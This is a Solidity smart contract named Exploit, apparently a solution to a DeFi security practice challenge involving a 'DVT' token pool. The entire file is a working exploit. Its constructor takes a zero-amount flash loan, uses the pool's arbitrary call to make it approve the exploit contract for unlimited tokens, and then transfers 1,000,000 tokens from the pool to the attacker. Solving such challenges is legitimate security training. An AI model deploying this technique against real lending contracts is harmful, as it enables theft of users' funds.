// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Exploit {

    using Address for address;

    constructor (address pool, address attacker, address token) {
			// have attacker take out a flash loan of 0 DVT
			// tell pool to call dvt.approve(exploitContract, max uint)
			// exploitContract initiates a transfer of all funds from pool to attacker
			pool.functionCall(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, attacker, token, abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)));
			IERC20(token).transferFrom(pool, attacker, 1_000_000 ether);
		}
}
